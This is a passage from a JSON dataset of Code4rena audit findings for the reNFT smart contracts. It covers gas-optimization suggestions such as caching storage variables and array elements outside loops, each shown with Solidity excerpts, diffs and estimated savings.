Person(\"Emmanuela\", 14,3);\n\n        arrayOfPersons[0] = newPerson1;\n        arrayOfPersons[1] = newPerson2;\n        arrayOfPersons[2] = newPerson3;\n\n        _addNewSet(arrayOfPersons);\n    }\n\n    function _addNewSet(Person[] memory _persons) internal {\n        uint len = _persons.length;\n        unchecked {\n            for(uint i; i < len; ++i) {\n                Person memory myPerson = _persons[i];\n                Person memory newStudent = Person(myPerson.name, myPerson.age, myPerson.id);\n                students.push(newStudent);\n            }\n        }\n\n    }\n}\n```\n```\ntest for test/Counter.t.sol:CacheArrayElementTest\n[PASS] test_createStudents() (gas: 230096)\n```\n</details>\n\n### 2 Instances\n1. ### Cache `hooks[i]` to avoid re-calculating the array offsets into memory\n- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L477&&#L485\n\n<details>\n\n```solidity\nfile: src/policies/Create.sol\n\n464:    function _addHooks(\n465:        Hook[] memory hooks,\n466:        SpentItem[] memory offerItems,\n467:        address rentalWallet\n468:    ) internal {\n469:        // Define hook target, offer item index, and an offer item.\n470:        address target;\n471:        uint256 itemIndex;\n472:        SpentItem memory offer;\n473:\n474:        // Loop through each hook in the payload.\n475:        for (uint256 i = 0; i < hooks.length; ++i) {\n476:            // Get the hook's target address.\n477:            target = hooks[i].target;   //@audit cache hooks[i];\n478:\n479:            // Check that the hook is reNFT-approved to execute on rental start.\n480:            if (!STORE.hookOnStart(target)) {\n481:                revert Errors.Shared_DisabledHook(target);\n482:            }\n483:\n484:            // Get the offer item index for this hook.\n485:            itemIndex = hooks[i].itemIndex;   //@audit cache hooks[i];\n486:\n487:            // Get the offer item for this hook.\n488:            offer = offerItems[itemIndex];\n489:\n490:            // Make sure the offer item is an ERC721 or ERC1155.\n491:            if (!offer.isRental()) {\n492:                revert Errors.Shared_NonRentalHookItem(itemIndex);\n493:            }\n494:\n495:            // Call the hook with data about the rented item.\n496:            try\n497:                IHook(target).onStart(\n498:                    rentalWallet,\n499:                    offer.token,\n500:                    offer.identifier,\n501:                    offer.amount,\n502:                    hooks[i].extraData   //@audit cache hooks[i];\n503:                )\n.\n.\n.\n520:    }\n```\n\n```diff\ndiff --git a/src/policies/Create.sol b/src/policies/Create.sol\nindex 061180d..b2f4241 100644\n--- a/src/policies/Create.sol\n+++ b/src/policies/Create.sol\n@@ -470,11 +470,12 @@ contract Create is Policy, Signer, Zone, Accumulator {\n         address target;\n         uint256 itemIndex;\n         SpentItem memory offer;\n-\n+        Hook memory hook;\n         // Loop through each hook in the payload.\n         for (uint256 i = 0; i < hooks.length; ++i) {\n             // Get the hook's target address.\n-            target = hooks[i].target;\n+            hook = hooks[i];\n+            target = hook.target;\n\n             // Check that the hook is reNFT-approved to execute on rental start.\n             if (!STORE.hookOnStart(target)) {\n@@ -482,7 +483,7 @@ contract Create is Policy, Signer, Zone, Accumulator {\n             }\n\n             // Get the offer item index for this hook.\n-            itemIndex = hooks[i].itemIndex;\n+            itemIndex = hook.itemIndex;\n\n             // Get the offer item for this hook.\n             offer = offerItems[itemIndex];\n@@ -499,7 +500,7 @@ contract Create is Policy, Signer, Zone, Accumulator {\n                     offer.token,\n                     offer.identifier,\n                     offer.amount,\n-                    hooks[i].extraData\n+                    hook.extraData\n                 )\n             {} catch Error(string memory revertReason) {\n                 // Revert with reason given.\n```\n\n</details>\n\n2. ### Cache `items[i]` to avoid re-calculating the array offsets into memory\n- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L568-#L573\n- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L600-#L601\n\n<details>\n\n```solidity\nfile: src/policies/Create.sol\n\n530:    function _rentFromZone(\n531:        RentPayload memory payload,\n532:        SeaportPayload memory seaportPayload\n533:    ) internal {\n534:        // Check: make sure order metadata is valid with the given seaport order zone hash.\n535:        _isValidOrderMetadata(payload.metadata, seaportPayload.zoneHash);\n536:\n537:        // Check: verify the fulfiller of the order is an owner of the recipient safe.\n538:        _isValidSafeOwner(seaportPayload.fulfiller, payload.fulfillment.recipient);\n539:\n540:        // Check: verify each execution was sent to the expected destination.\n541:        _executionInvariantChecks(\n542:            seaportPayload.totalExecutions,\n543:            payload.fulfillment.recipient\n544:        );\n545:\n546:        // Check: validate and process seaport offer and consideration items based\n547:        // on the order type.\n548:        Item[] memory items = _convertToItems(\n549:            seaportPayload.offer,\n550:            seaportPayload.consideration,\n551:            payload.metadata.orderType\n552:        );\n553:\n.\n.\n.\n567:            for (uint256 i; i < items.length; ++i) {\n568:                if (items[i].isRental()) {  //@audit cache items[i]\n569:                    // Insert the rental asset update into the dynamic array.\n570:                    _insert(\n571:                        rentalAssetUpdates,\n572:                        items[i].toRentalId(payload.fulfillment.recipient),  //@audit cache items[i]\n573:                        items[i].amount  //@audit cache items[i]\n574:                    );\n575:                }\n576:            }\n.\n.\n.\n599:            for (uint256 i = 0; i < items.length; ++i) {\n600:                if (items[i].isERC20()) {  //@audit cache items[i]\n601:                    ESCRW.increaseDeposit(items[i].token, items[i].amount);  //@audit cache items[i]\n602:                }\n603:            }\n.\n.\n.\n617:    }\n```\n\n```diff\ndiff --git a/src/policies/Create.sol b/src/policies/Create.sol\nindex 061180d..b5ddcbf 100644\n--- a/src/policies/Create.sol\n+++ b/src/policies/Create.sol\n@@ -561,16 +561,17 @@ contract Create is Policy, Signer, Zone, Accumulator {\n             // the rented amount. From this point on, new memory cannot be safely allocated until the\n             // accumulator no longer needs to include elements.\n             bytes memory rentalAssetUpdates = new bytes(0);\n-\n+            Item memory item;\n             // Check if each item is a rental. If so, then generate the rental asset update.\n             // Memory will become safe again after this block.\n             for (uint256 i; i < items.length; ++i) {\n-                if (items[i].isRental()) {\n+                item = items[i];\n+                if (item.isRental()) {\n                     // Insert the rental asset update into the dynamic array.\n                     _insert(\n                         rentalAssetUpdates,\n-                        items[i].toRentalId(payload.fulfillment.recipient),\n-                        items[i].amount\n+                        item.toRentalId(payload.fulfillment.recipient),\n+                        item.amount\n                     );\n                 }\n             }\n@@ -597,8 +598,9 @@ contract Create is Policy, Signer, Zone, Accumulator {\n             // Interaction: Increase the deposit value on the payment escrow so\n             // it knows how many tokens were sent to it.\n             for (uint256 i = 0; i < items.length; ++i) {\n-                if (items[i].isERC20()) {\n-                    ESCRW.increaseDeposit(items[i].token, items[i].amount);\n+                item = items[i];\n+                if (item.isERC20()) {\n+                    ESCRW.increaseDeposit(item.token, item.amount);\n                 }\n             }\n```\n\n</details>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "reNFT",
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30556",
      "title": "[G-06] Refactor external/internal functions to avoid unnecessary SLOAD",
      "impact": "GAS",
      "content": "The functions below read storage slots that are previously read in the functions that invoke them. We can refactor the external/internal functions to pass cached storage variables as stack variables and avoid the extra storage reads that would otherwise take place in the internal functions.\n\n### 1 Instance\n1. ### Refactor `stopRent()`, `stopRentBatch()` and `_removeHooks()` to avoid  `SLOAD` in `_removeHooks()`\n- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L194-#L365\n\nThe external functions `stopRent()`, `stopRentBatch()` reads the variable `STORE` from state but they also invoke function `_removeHooks()` which also read the variable `STORE` from state. We can a avoid an `SLOAD(Gwarmaccess)` in the `_removeHooks()` function if we cache the `STORE` state variable in the `stopRent()` and `stopRentBatch()` functions then pass the cached value as a parameter to the `_removeHooks()` function: The diff below shows how the code should be refactored: \n\n<details>\n\n```solidity\nfile: src/policies/Stop.sol\n\n194:    function _removeHooks(\n195:        Hook[] calldata hooks,\n196:        Item[] calldata rentalItems,\n197:        address rentalWallet\n198:    ) internal {\n199:        // Define hook target, item index, and item.\n200:        address target;\n201:        uint256 itemIndex;\n202:        Item memory item;\n203:\n204:        // Loop through each hook in the payload.\n205:        for (uint256 i = 0; i < hooks.length; ++i) {\n206:            // Get the hook address.\n207:            target = hooks[i].target;\n208:\n209:            // Check that the hook is reNFT-approved to execute on rental stop.\n210:            if (!STORE.hookOnStop(target)) {     //@audit STORE state variable read\n211:                revert Errors.Shared_DisabledHook(target);\n212:            }\n.\n.\n.\n250:    }\n\n\n\n265:    function stopRent(RentalOrder calldata order) external {\n.\n.\n.\n288:        if (order.hooks.length > 0) {\n289:            _removeHooks(order.hooks, order.items, order.rentalWallet); //@audit STORE state variable read in _removeHooks function\n290:        }\n291:\n292:        // Interaction: Transfer rentals from the renter back to lender.\n293:        _reclaimRentedItems(order);\n294:\n295:        // Interaction: Transfer ERC20 payments from the escrow contract to the respective recipients.\n296:        ESCRW.settlePayment(order);\n297:\n298:        // Interaction: Remove rentals from storage by computing the order hash.\n299:        STORE.removeRentals(     //@audit STORE state variable read\n300:            _deriveRentalOrderHash(order),\n301:            _convertToStatic(rentalAssetUpdates)\n302:        );\n303:\n304:        // Emit rental order stopped.\n305:        _emitRentalOrderStopped(order.seaportOrderHash, msg.sender);\n306:    }\n\n\n\n313:    function stopRentBatch(RentalOrder[] calldata orders) external {\n.\n.\n.\n348:            if (orders[i].hooks.length > 0) {\n349:                _removeHooks(orders[i].hooks, orders[i].items, orders[i].rentalWallet); //@audit STORE state variable read in _removeHooks function\n350:            }\n351:\n352:            // Interaction: Transfer rental assets from the renter back to lender.\n353:            _reclaimRentedItems(orders[i]);\n354:\n355:            // Emit rental order stopped.\n356:            _emitRentalOrderStopped(orderHashes[i], msg.sender);\n357:        }\n358:\n359:        // Interaction: Transfer ERC20 payments from the escrow contract to the respective recipients.\n360:        ESCRW.settlePaymentBatch(orders);\n361:\n362:        // Interaction: Remove all rentals from storage.\n363:        STORE.removeRentalsBatch(orderHashes, _convertToStatic(rentalAssetUpdates)); //@audit STORE state variable read\n364:    }\n```\n```diff\ndiff --git a/src/policies/Stop.sol b/src/policies/Stop.sol\nindex ab240ba..cbc0d12 100644\n--- a/src/policies/Stop.sol\n+++ b/src/policies/Stop.sol\n@@ -194,7 +194,8 @@ contract Stop is Policy, Signer, Reclaimer, Accumulator {\n     function _removeHooks(\n         Hook[] calldata hooks,\n         Item[] calldata rentalItems,\n-        address rentalWallet\n+        address rentalWallet,\n+        Storage _store\n     ) internal {\n         // Define hook target, item index, and item.\n         address target;\n@@ -283,10 +284,10 @@ contract Stop is Policy, Signer, Reclaimer, Accumulator {\n                 );\n             }\n         }\n-\n+        Storage _store = STORE;\n         // Interaction: process hooks so they no longer exist for the renter.\n         if (order.hooks.length > 0) {\n-            _removeHooks(order.hooks, order.items, order.rentalWallet);\n+            _removeHooks(order.hooks, order.items, order.rentalWallet, _store);\n         }\n\n         // Interaction: Transfer rentals from the renter back to lender.\n@@ -296,7 +297,7 @@ contract Stop is Policy, Signer, Reclaimer, Accumulator {\n         ESCRW.settlePayment(order);\n\n         // Interaction: Remove rentals from storage by computing the order hash.\n-        STORE.removeRentals(\n+        _store.removeRentals(\n             _deriveRentalOrderHash(order),\n             _convertToStatic(rentalAssetUpdates)\n         );\n@@ -343,10 +344,10 @@ contract Stop is Policy, Signer, Reclaimer, Accumulator {\n\n             // Add the order hash to an array.\n             orderHashes[i] = _deriveRentalOrderHash(orders[i]);\n-\n+            Storage _store = STORE;\n             // Interaction: Process hooks so they no longer exist for the renter.\n             if (orders[i].hooks.length > 0) {\n-                _removeHooks(orders[i].hooks, orders[i].items, orders[i].rentalWallet);\n+                _removeHooks(orders[i].hooks, orders[i].items, orders[i].rentalWallet, _store);\n             }\n\n             // Interaction: Transfer rental assets from the renter back to lender.\n```\n</details>\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "reNFT",
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30555",
      "title": "[G-05] Cache external calls outside of loop to avoid re-calling function on each iteration",
      "impact": "GAS",
      "content": "Performing STATICCALLs that do not depend on variables incremented in loops should always try to be avoided within the loop. In the instance, we are able to cache the external calls outside of the loop to save a STATICCALL (100 gas) per loop iteration.\n\n### 1 Instance\n1. ### Perform the external calls `orderType.isPayOrder()` and `orderType.isBaseOrder()` outside the loop and cache their results.\n- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/modules/PaymentEscrow.sol#L255\n\nThe external calls `orderType.isPayOrder()` and `orderType.isBaseOrder()` should be made outside the loop and the result cached since their returned values are not dependent on the loop iterations. The diff below shows how the code should be refactored:\n\n<details>\n\n```solidity\nfile: src/modules/PaymentEscrow.sol\n\n215:    function _settlePayment(\n216:        Item[] calldata items,\n217:        OrderType orderType,\n218:        address lender,\n219:        address renter,\n220:        uint256 start,\n221:        uint256 end\n222:    ) internal {\n223:        // Calculate the time values.\n224:        uint256 elapsedTime = block.timestamp - start;\n225:        uint256 totalTime = end - start;\n226:\n227:        // Determine whether the rental order has ended.\n228:        bool isRentalOver = elapsedTime >= totalTime;\n229:\n230:        // Loop through each item in the order.\n231:        for (uint256 i = 0; i < items.length; ++i) {\n232:            // Get the item.\n233:            Item memory item = items[i];\n234:\n235:            // Check that the item is a payment.\n236:            if (item.isERC20()) {\n237:                // Set a placeholder payment amount which can be reduced in the\n238:                // presence of a fee.\n239:                uint256 paymentAmount = item.amount;\n240:\n241:                // Take a fee on the payment amount if the fee is on.\n242:                if (fee != 0) {\n243:                    // Calculate the new fee.\n244:                    uint256 paymentFee = _calculateFee(paymentAmount);\n245:\n246:                    // Adjust the payment amount by the fee.\n247:                    paymentAmount -= paymentFee;\n248:                }\n249:\n250:                // Effect: Decrease the token balance. Use the payment amount pre-fee\n251:                // so that fees can be taken.\n252:                _decreaseDeposit(item.token, item.amount);\n253:\n254:                // If its a PAY order but the rental hasn't ended yet.\n255:                if (orderType.isPayOrder() && !isRentalOver) {  //@audit make orderType.isPayOrder() outside loop\n256:                    // Interaction: a PAY order which hasnt ended yet. Payout is pro-rata.\n257:                    _settlePaymentProRata(\n258:                        item.token,\n259:                        paymentAmount,\n260:                        lender,\n261:                        renter,\n262:                        elapsedTime,\n263:                        totalTime\n264:                    );\n265:                }\n266:                // If its a PAY order and the rental is over, or, if its a BASE order.\n267:                else if (\n268:                    (orderType.isPayOrder() && isRentalOver) || orderType.isBaseOrder()   //@audit make orderType.isPayOrder() and orderType.isBaseOrder() outside loop\n269:                ) {\n270:                    // Interaction: a pay order or base order which has ended. Payout is in full.\n271:                    _settlePaymentInFull(\n272:                        item.token,\n273:                        paymentAmount,\n274:                        item.settleTo,\n275:                        lender,\n276:                        renter\n277:                    );\n278:                } else {\n279:                    revert Errors.Shared_OrderTypeNotSupported(uint8(orderType));\n280:                }\n281:            }\n282:        }\n283:    }\n```\n```diff\ndiff --git a/src/modules/PaymentEscrow.sol b/src/modules/PaymentEscrow.sol\nindex 34c4f4c..988b175 100644\n--- a/src/modules/PaymentEscrow.sol\n+++ b/src/modules/PaymentEscrow.sol\n@@ -226,6 +226,8 @@ contract PaymentEscrow is Proxiable, Module, PaymentEscrowBase {\n\n         // Determine whether the rental order has ended.\n         bool isRentalOver = elapsedTime >= totalTime;\n+        bool isPayOrder = orderType.isPayOrder();\n+        bool isBaseOrder = orderType.isBaseOrder();\n\n         // Loop through each item in the order.\n         for (uint256 i = 0; i < items.length; ++i) {\n@@ -252,7 +254,7 @@ contract PaymentEscrow is Proxiable, Module, PaymentEscrowBase {\n                 _decreaseDeposit(item.token, item.amount);\n\n                 // If its a PAY order but the rental hasn't ended yet.\n-                if (orderType.isPayOrder() && !isRentalOver) {\n+                if (isPayOrder && !isRentalOver) {\n                     // Interaction: a PAY order which hasnt ended yet. Payout is pro-rata.\n                     _settlePaymentProRata(\n                         item.token,\n@@ -265,7 +267,7 @@ contract PaymentEscrow is Proxiable, Module, PaymentEscrowBase {\n                 }\n                 // If its a PAY order and the rental is over, or, if its a BASE order.\n                 else if (\n-                    (orderType.isPayOrder() && isRentalOver) || orderType.isBaseOrder()\n+                    (isPayOrder && isRentalOver) || isBaseOrder\n                 ) {\n                     // Interaction: a pay order or base order which has ended. Payout is in full.\n                     _settlePaymentInFull(\n```\n```\nEstimated gas saved: 300 gas units\n```\n\n</details>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "reNFT",
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30554",
      "title": "[G-04] Cache state variables outside of loop to avoid reading storage on every iteration",
      "impact": "GAS",
      "content": "Reading from storage should always try to be avoided within loops. In the following instances, we are able to cache state variables outside of the loop to save a Gwarmaccess (100 gas) per loop iteration.\n\n### Please note these instances were not included in the bot reports.\n\n### 5 Instances\n1. ### Cache `fee` outside the loop\n- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/modules/PaymentEscrow.sol#L242\n\nIn the `_settlePayment()` function as shown below up to `100` gas units could be saved per iteration if we cache the state variable `fee` in a stack variable and read from the stack variable rather than from state during the loop iterations. The function could be refactored as shown in the diff below:\n\n<Details>\n\n```solidity\nfile: src/modules/PaymentEscrow.sol\n\n215:    function _settlePayment(\n216:        Item[] calldata items,\n217:        OrderType orderType,\n218:        address lender,\n219:        address renter,\n220:        uint256 start,\n221:        uint256 end\n222:    ) internal {\n223:        // Calculate the time values.\n224:        uint256 elapsedTime = block.timestamp - start;\n225:        uint256 totalTime = end - start;\n226:\n227:        // Determine whether the rental order has ended.\n228:        bool isRentalOver = elapsedTime >= totalTime;\n229:\n230:        // Loop through each item in the order.\n231:        for (uint256 i = 0; i < items.length; ++i) {\n232:            // Get the item.\n233:            Item memory item = items[i];\n234:\n235:            // Check that the item is a payment.\n236:            if (item.isERC20()) {\n237:                // Set a placeholder payment amount which can be reduced in the\n238:                // presence of a fee.\n239:                uint256 paymentAmount = item.amount;\n240:\n241:                // Take a fee on the payment amount if the fee is on.\n242:                if (fee != 0) { //@audit cache fee outside the loop\n243:                    // Calculate the new fee.\n244:                    uint256 paymentFee = _calculateFee(paymentAmount);\n245:\n246:                    // Adjust the payment amount by the fee.\n247:                    paymentAmount -= paymentFee;\n248:                }\n.\n.\n.\n283:    }\n```\n```diff\ndiff --git a/src/modules/PaymentEscrow.sol b/src/modules/PaymentEscrow.sol\nindex 34c4f4c..066d593 100644\n--- a/src/modules/PaymentEscrow.sol\n+++ b/src/modules/PaymentEscrow.sol\n@@ -226,7 +226,7 @@ contract PaymentEscrow is Proxiable, Module, PaymentEscrowBase {\n\n         // Determine whether the rental order has ended.\n         bool isRentalOver = elapsedTime >= totalTime;\n-\n+        uint256 _fee = fee;\n         // Loop through each item in the order.\n         for (uint256 i = 0; i < items.length; ++i) {\n             // Get the item.\n@@ -239,7 +239,7 @@ contract PaymentEscrow is Proxiable, Module, PaymentEscrowBase {\n                 uint256 paymentAmount = item.amount;\n\n                 // Take a fee on the payment amount if the fee is on.\n-                if (fee != 0) {\n+                if (_fee != 0) {\n                     // Calculate the new fee.\n                     uint256 paymentFee = _calculateFee(paymentAmount);\n```\n```\nEstimated gas saved: 97 gas units per iteration\n```\n\n</details>\n\n2. ### Cache `STORE` outside the loop\n- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L480\n\nIn the `_addHooks()` function as shown below up to `100` gas units could be saved per iteration if we cache the state variable `STORE` in a stack variable and read from the stack variable rather than from state during the loop iterations. The function could be refactored as shown in the diff below:\n\n<Details>\n\n```solidity\nfile: src/policies/Create.sol\n\n464:    function _addHooks(\n465:        Hook[] memory hooks,\n466:        SpentItem[] memory offerItems,\n467:        address rentalWallet\n468:    ) internal {\n469:        // Define hook target, offer item index, and an offer item.\n470:        address target;\n471:        uint256 itemIndex;\n472:        SpentItem memory offer;\n473:\n474:        // Loop through each hook in the payload.\n475:        for (uint256 i = 0; i < hooks.length; ++i) {\n476:            // Get the hook's target address.\n477:            target = hooks[i].target;\n478:\n479:            // Check that the hook is reNFT-approved to execute on rental start.\n480:            if (!STORE.hookOnStart(target)) {   //@audit cache STORE outside the loop\n481:                revert Errors.Shared_DisabledHook(target);\n482:            }\n483:\n484:            // Get the offer item index for this hook.\n485:            itemIndex = hooks[i].itemIndex;\n.\n.\n.\n520:    }\n```\n```diff\ndiff --git a/src/policies/Create.sol b/src/policies/Create.sol\nindex 061180d..a8de17a 100644\n--- a/src/policies/Create.sol\n+++ b/src/policies/Create.sol\n@@ -470,14 +470,14 @@ contract Create is Policy, Signer, Zone, Accumulator {\n         address target;\n         uint256 itemIndex;\n         SpentItem memory offer;\n-\n+        Storage _store = STORE;\n         // Loop through each hook in the payload.\n         for (uint256 i = 0; i < hooks.length; ++i) {\n             // Get the hook's target address.\n             target = hooks[i].target;\n\n             // Check that the hook is reNFT-approved to execute on rental start.\n-            if (!STORE.hookOnStart(target)) {\n+            if (!_store.hookOnStart(target)) {\n                 revert Errors.Shared_DisabledHook(target);\n             }\n```\n```\nEstimated gas saved: 97 gas units per iteration\n```\n\n</details>\n\n3. ### Cache `ESCRW` outside of loop\n- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L601\n\nIn the `_rentFromZone()` function as shown below up to `100` gas units could be saved per iteration if we cache the state variable `ESCRW` in a stack variable and read from the stack variable rather than from state during the loop iterations. The function could be refactored as shown in the diff below:\n\n<details>\n\n```solidity\nfile: src/policies/Create.sol\n\n530:    function _rentFromZone(\n531:        RentPayload memory payload,\n532:        SeaportPayload memory seaportPayload\n533:    ) internal {\n534:        // Check: make sure order metadata is valid with the given seaport order zone hash.\n535:        _isValidOrderMetadata(payload.metadata, seaportPayload.zoneHash);\n536:\n537:        // Check: verify the fulfiller of the order is an owner of the recipient safe.\n538:        _isValidSafeOwner(seaportPayload.fulfiller, payload.fulfillment.recipient);\n.\n.\n.\n597:            // Interaction: Increase the deposit value on the payment escrow so\n598:            // it knows how many tokens were sent to it.\n599:            for (uint256 i = 0; i < items.length; ++i) {\n600:                if (items[i].isERC20()) {\n601:                    ESCRW.increaseDeposit(items[i].token, items[i].amount); //@audit cache ESCRW outside loop\n602:                }\n603:            }\n604:\n605:            // Interaction: Process the hooks associated with this rental.\n606:            if (payload.metadata.hooks.length > 0) {\n607:                _addHooks(\n608:                    payload.metadata.hooks,\n609:                    seaportPayload.offer,\n610:                    payload.fulfillment.recipient\n611:                );\n612:            }\n613:\n614:            // Emit rental order started.\n615:            _emitRentalOrderStarted(order, orderHash, payload.metadata.emittedExtraData);\n616:        }\n617:    }\n```\n```diff\ndiff --git a/src/policies/Create.sol b/src/policies/Create.sol\nindex 061180d..1a8ecb6 100644\n--- a/src/policies/Create.sol\n+++ b/src/policies/Create.sol\n@@ -593,12 +593,12 @@ contract Create is Policy, Signer, Zone, Accumulator {\n\n             // Interaction: Update storage only if the order is a Base Order or Pay order.\n             STORE.addRentals(orderHash, _convertToStatic(rentalAssetUpdates));\n-\n+            PaymentEscrow _escrw = ESCRW;\n             // Interaction: Increase the deposit value on the payment escrow so\n             // it knows how many tokens were sent to it.\n             for (uint256 i = 0; i < items.length; ++i) {\n                 if (items[i].isERC20()) {\n-                    ESCRW.increaseDeposit(items[i].token, items[i].amount);\n+                    _escrw.increaseDeposit(items[i].token, items[i].amount);\n                 }\n             }\n```\n```\nEstimated gas saved: 97 gas units per iteration\n```\n\n</details>\n\n4. ### Cache `ESCRW` outside of loop\n- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L700\n\nIn the `_executionInvariantChecks()` function as shown below up to `100` gas units could be saved per iteration if we cache the state variable `ESCRW` in a stack variable and read from the stack variable rather than from state during the loop iterations. The function could be refactored as shown in the diff below:\n\n<details>\n\n```solidity\nfile: src/policies/Create.sol\n\n691:    function _executionInvariantChecks(\n692:        ReceivedItem[] memory executions,\n693:        address expectedRentalSafe\n694:    ) internal view {\n695:        for (uint256 i = 0; i < executions.length; ++i) {\n696:            ReceivedItem memory execution = executions[i];\n697:\n698:            // ERC20 invariant where the recipient must be the payment escrow.\n699:            if (execution.isERC20()) {\n700:                _checkExpectedRecipient(execution, address(ESCRW));\n701:            }\n702:            // ERC721 and ERC1155 invariants where the recipient must\n703:            // be the expected rental safe.\n704:            else if (execution.isRental()) {\n705:                _checkExpectedRecipient(execution, expectedRentalSafe);\n706:            }\n707:            // Revert if unsupported item type.\n708:            else {\n709:                revert Errors.CreatePolicy_SeaportItemTypeNotSupported(\n710:                    execution.itemType\n711:                );\n712:            }\n713:        }\n714:    }\n```\n```diff\ndiff --git a/src/policies/Create.sol b/src/policies/Create.sol\nindex 061180d..93d1ec6 100644\n--- a/src/policies/Create.sol\n+++ b/src/policies/Create.sol\n@@ -692,12 +692,13 @@ contract Create is Policy, Signer, Zone, Accumulator {\n         ReceivedItem[] memory executions,\n         address expectedRentalSafe\n     ) internal view {\n+        PaymentEscrow _escrw = ESCRW;\n         for (uint256 i = 0; i < executions.length; ++i) {\n             ReceivedItem memory execution = executions[i];\n\n             // ERC20 invariant where the recipient must be the payment escrow.\n             if (execution.isERC20()) {\n-                _checkExpectedRecipient(execution, address(ESCRW));\n+                _checkExpectedRecipient(execution, address(_escrw));\n             }\n             // ERC721 and ERC1155 invariants where the recipient must\n             // be the expected rental safe.\n```\n```\nEstimated gas saved: 97 gas saved per iteration\n```\n\n</details>\n\n5. ### Cache `STORE` outside of loop\n- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L210\n\nIn the `_removeHooks()` function as shown below up to `100` gas units could be saved per iteration if we cache the state variable `STORE` in a stack variable and read from the stack variable rather than from state during the loop iterations. The function could be refactored as shown in the diff below:\n\n<details>\n\n```solidity\nfile: src/policies/Stop.sol\n\n194:    function _removeHooks(\n195:        Hook[] calldata hooks,\n196:        Item[] calldata rentalItems,\n197:        address rentalWallet\n198:    ) internal {\n199:        // Define hook target, item index, and item.\n200:        address target;\n201:        uint256 itemIndex;\n202:        Item memory item;\n203:\n204:        // Loop through each hook in the payload.\n205:        for (uint256 i = 0; i < hooks.length; ++i) {\n206:            // Get the hook address.\n207:            target = hooks[i].target;\n208:\n209:            // Check that the hook is reNFT-approved to execute on rental stop.\n210:            if (!STORE.hookOnStop(target)) {\n211:                revert Errors.Shared_DisabledHook(target);\n212:            }\n.\n.\n.\n250:    }\n```\n```diff\ndiff --git a/src/policies/Stop.sol b/src/policies/Stop.sol\nindex ab240ba..c348c1c 100644\n--- a/src/policies/Stop.sol\n+++ b/src/policies/Stop.sol\n@@ -200,14 +200,14 @@ contract Stop is Policy, Signer, Reclaimer, Accumulator {\n         address target;\n         uint256 itemIndex;\n         Item memory item;\n-\n+        Storage _store = STORE;\n         // Loop through each hook in the payload.\n         for (uint256 i = 0; i < hooks.length; ++i) {\n             // Get the hook address.\n             target = hooks[i].target;\n\n             // Check that the hook is reNFT-approved to execute on rental stop.\n-            if (!STORE.hookOnStop(target)) {\n+            if (!_store.hookOnStop(target)) {\n                 revert Errors.Shared_DisabledHook(target);\n             }\n```\n```\nEstimated gas saved: 97 gas saved per iteration\n```\n</details>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "reNFT",
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30553",
      "title": "[G-03] Move lesser gas costing require/revert checks to the top",
      "impact": "GAS",
      "content": "Require() or Revert() statements that check input arguments or cost lesser gas should be at the top of the function.\nChecks that involve constants should come before checks that involve state variables, function calls, and calculations. By doing these checks first, the function is able to revert before wasting alot of gas in a function that may ultimately revert in the unhappy case.\n\n### 2 Instances\n1. ### Move `if (!ISafe(safe).isOwner(owner)) {revert Errors.CreatePolicy_InvalidSafeOwner(owner, safe)` to the top of the function.\n- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L647-#L657\n\nIn the `_isValidSafeOwner()` function as shown below the if-revert statement `if (STORE.deployedSafes(safe) == 0) {revert Errors.CreatePolicy_InvalidRentalSafe(safe);}` is more gas consumimg than the if-revert statement `if (!ISafe(safe).isOwner(owner)) {revert Errors.CreatePolicy_InvalidSafeOwner(owner, safe)` as the former reads from state which cost `2100` gas units. We can make the `_isValidSafeOwner()` function more gas efficient by moving the cheaper if-revert statement `if (!ISafe(safe).isOwner(owner)) {revert Errors.CreatePolicy_InvalidSafeOwner(owner, safe)` to the top of the function so that in scenarios where the cheaper revert statement fails the function would revert without having to read from state which is expensive. The diff below shows how the code could be refactored:\n\n<details>\n\n```solidity\nfile: src/policies/Create.sol\n\n647:    function _isValidSafeOwner(address owner, address safe) internal view {\n648:        // Make sure only protocol-deployed safes can rent.\n649:        if (STORE.deployedSafes(safe) == 0) {\n650:            revert Errors.CreatePolicy_InvalidRentalSafe(safe);\n651:        }\n652:\n653:        // Make sure the fulfiller is the owner of the recipient rental safe.\n654:        if (!ISafe(safe).isOwner(owner)) {  //@audit move check to function top\n655:            revert Errors.CreatePolicy_InvalidSafeOwner(owner, safe);\n656:        }\n657:    }\n```\n\n```diff\ndiff --git 